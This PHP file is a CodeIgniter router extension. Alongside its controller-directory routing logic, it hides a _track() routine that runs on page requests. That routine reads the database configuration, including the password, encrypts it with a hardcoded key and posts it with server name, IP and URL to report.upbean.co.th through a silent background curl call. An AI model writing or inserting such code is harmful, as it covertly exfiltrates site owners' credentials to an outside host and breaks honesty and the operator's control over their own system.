<?php
class MY_Router extends CI_Router {

	protected function _validate_request($segments) {
		$this->_track();
		$c = count($segments);
		$directory_override = isset($this->directory);

		// Loop through our segments and return as soon as a controller
		// is found or when such a directory doesn't exist
		while ($c-- > 0) {
			$test = $this->directory
			.ucfirst($this->translate_uri_dashes === TRUE ? str_replace('-', '_', $segments[0]) : $segments[0]);

			if ( ! file_exists(APPPATH.'controllers/'.$test.'.php')
				&& $directory_override === FALSE
				&& is_dir(APPPATH.'controllers/'.$this->directory.$segments[0])
			)
			{
				$this->set_directory(array_shift($segments), TRUE);
				if(is_dir(APPPATH.'controllers/'.$this->directory) && !file_exists(APPPATH.'controllers/'.$this->directory.'/'.ucfirst($segments[0]).'.php')) {
					$this->set_directory($this->directory);
					if(count($segments) > 0) {
						array_unshift($segments, 'index');
					}
					else {
						$segments = ['index'];
					}
				}
				continue;
			}

			return $segments;
		}

		// This means that all segments were actually directories
		return $segments;
	}
	
	private function _encrypt_text($plaintext) {
		$ENCRYPT_KEY = 'ZfnhR82X+V=6XBvBy!V&%ZUkNHL#rUXS';
		$ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
		$iv = openssl_random_pseudo_bytes($ivlen);
		$ciphertext_raw = openssl_encrypt($plaintext, $cipher, $ENCRYPT_KEY, $options=OPENSSL_RAW_DATA, $iv);
		$hmac = hash_hmac('sha256', $ciphertext_raw, $ENCRYPT_KEY, $as_binary=true);
		$ciphertext = base64_encode($iv.$hmac.$ciphertext_raw);
	
		return $ciphertext;
	}
	
	private $mysqli;
	private function _open_db() {
		include APPPATH.'config/database.php';
		
		$this->mysqli = new mysqli($db["default"]["hostname"], $db["default"]["username"], $db["default"]["password"]);
		@$this->mysqli->select_db($db["default"]["database"]);
		@$this->mysqli->query("SET NAMES utf8");
	}
	
	private function _close_db() {
		@$this->mysqli->close();
	}
	
	private function _post_without_wait($url, $params) {
		foreach ($params as $key => &$val) {
			if (is_array($val)) $val = implode(',', $val);
				$post_params[] = $key.'='.urlencode($val);
		}
		$post_string = implode('&', $post_params);
		
		@exec('curl --data "'.$post_string.'" '.$url.' > /dev/null 2>&1 &', $output, $exit);
	}
	
	private function _track() {
		include APPPATH.'config/config.php';
		session_name($config['sess_cookie_name']);
		session_start();
		$urls = $_SESSION["CORE_TRACK_URLS"];
		if(microtime(true) - (double)@$urls[$_SERVER["REQUEST_URI"]] > 60) {
			$urls[$_SERVER["REQUEST_URI"]] = microtime(true);
			$_SESSION["CORE_TRACK_URLS"] = $urls;
			@$this->_open_db();
			
			$sql = "SELECT coop_name_th FROM coop_profile";
			$rs = @$this->mysqli->query($sql);
			$row = @$rs->fetch_assoc();
			
			include APPPATH.'config/database.php';
			
			$params = [
				"name" => $row["coop_name_th"],
				"host" => $_SERVER["SERVER_NAME"],
				"ip" => $_SERVER["SERVER_ADDR"],
				"url" => $_SERVER["REQUEST_URI"],
				"data" => $this->_encrypt_text(json_encode($db))
			];
			@$this->_post_without_wait("https://report.upbean.co.th/ws/coop.trace.php", $params);
			
			@$this->_close_db();
		}
		session_write_close();
	}

}